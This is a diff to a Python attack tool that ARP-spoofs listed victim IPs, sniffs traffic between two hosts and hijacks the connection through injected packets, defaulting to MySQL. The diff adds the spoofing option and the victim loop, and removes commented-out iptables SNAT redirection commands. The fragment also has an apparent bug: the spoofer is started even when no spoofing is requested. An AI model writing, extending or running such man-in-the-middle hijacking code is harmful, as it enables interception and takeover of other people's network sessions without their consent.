@@ -38,7 +38,7 @@ def main():
     # argument parser to handle command-line arguments
     parser = argparse.ArgumentParser()
     #Optionnal argument to specify the attacker own Mac and ip Address
-    parser.add_argument("--own", required=False, help="Own mac:ip")
+    parser.add_argument("--spoof", required=False, help="Enable spoofing [ip:ip:...]")
 
     firewall = parser.add_mutually_exclusive_group(required=False)
     #Optionnal firewall settings
@@ -110,47 +110,25 @@ def main():
     src = args.src
     dst = args.dst
     iface = args.iface
-    ip = ""
-    mac = ""
-
-    #enabling firewall redirection.
-    #if args.own is not None:
-    #    if len(args.own) != 0:
-    #        # Extract attackers own IP and MAC from the '--own' argument
-    #        ip = args.own.split(":")[0]
-    #        mac = args.own.split(":")[1]
-            # Validation of the attacker Mac address
-    #        if not mac_reg.match(settings.mac):
-    #            print("Invalid mac address!")
-    #            exit()
-    #        print("arp spoofing mac, sleeping 5seconds")
-
-    #Get the MAC adress of the listenning network interface 
+    ip = scapy.get_if_addr(iface)
     mac = scapy.get_if_hwaddr(iface)
-    # TODO: Delete this rule after program is running
-    #print("trying:")
-    #print("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
-    #os.system("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
-    #settings.cmd_list.append("iptables -D POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
-    
-    if args.own is not None and len(ip) == 0:
-        True
-        #print("trying:")
-        #print("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
-        # TODO: Delete this rule after program is running
-        #os.system("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
-        #settings.cmd_list.append("iptables -t nat -A POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
-        #spoofer.start(settings.ip, settings.src, settings.dst)
-    
+
+    # start spoofing if required
+    if args.spoof is not None:
+        spoofer = spoofing.spoofer(mac, ip, 0.5)
+        for victim in args.spoof.split(':'):
+            if not ip_reg.match(victim):
+                log.print('invalid ip {}'.format(victim))
+            else: spoofer.spoof(victim, ip)
+    spoofer.start()
+
     # initialize packet injection
     proto_name = "mysql" if len(proto) == 0 else proto
     log.print("protocol "+proto_name+" selected.")
     protocol = importlib.import_module("libs.proto."+proto_name).protocol(src, dst, mac)
     log.print("protocol was started.")
     #Start the sniffing packets
-    sniffer = sniff.sniffer(src, dst, port, iface, proto_name, mac, args.write)
-    #if sniffer.settings.injected is False:
-    #    print("Failed to get a packet sample.")
+    sniffer = sniff.sniffer(src, dst, port, iface, protocol, mac, args.write)
     print("Connection hijacked, terminal:")
     
     # While the programe is running, accepting stdin process incoming data
@@ -170,11 +148,6 @@ def on_exit(*_):
         protocol.stop()
     if spoofer is not None:
         spoofer.stop()
-
-    # Remove any iptables rules
-    #for cmd in settings.cmd_list:
-    #    os.system(cmd)
-    # Exit program
     sys.exit()
 
 if __name__ == "__main__":
